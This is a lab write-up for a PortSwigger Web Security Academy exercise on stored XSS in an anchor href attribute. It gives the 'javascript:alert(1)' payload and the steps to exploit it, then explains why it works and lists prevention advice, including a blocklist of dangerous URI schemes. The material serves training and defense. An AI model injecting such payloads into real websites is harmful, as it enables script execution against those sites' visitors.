# 🚨 Lab 26 — Stored XSS into Anchor `href` Attribute with Double Quotes HTML-Encoded

## 🧪 Lab Details

| Field | Value |
|---|---|
| **Lab No** | 26 |
| **Lab Name** | Stored XSS into anchor `href` attribute with double quotes HTML-encoded |
| **Category** | Stored XSS |
| **Platform** | PortSwigger Web Security Academy |

---

# 🎯 Goal

Inject JavaScript into a stored anchor tag URL.

---

# 🔍 Injection Point

- Website Field

---

# 💣 Payload

```javascript
javascript:alert(1)
```

---

# 🧠 Vulnerability Overview

User input is stored into an anchor tag:

```html
<a href="USER_INPUT">
```

Double quotes are encoded, but dangerous protocols are not filtered.

---

# ⚔️ Exploitation Steps

## 1️⃣ Submit Payload

```javascript
javascript:alert(1)
```

inside the website field.

---

## 2️⃣ Payload Stored in Database

The application stores the malicious URL.

---

## 3️⃣ Victim Clicks the Link

The browser executes:

```javascript
alert(1)
```

✅ Stored XSS Successfully Triggered

---

# 🧨 Why It Works

The browser supports the `javascript:` URI scheme inside anchor tags.

---

# 🛡️ Prevention

## ✅ Restrict Dangerous Protocols

Block:

```text
javascript:
data:
vbscript:
```

---

## ✅ Validate URLs Strictly

Allow only:

```text
https:
http:
```

---

# 💡 Key Takeaway

Encoding quotes alone does not stop XSS.

Dangerous URI schemes must also be filtered.
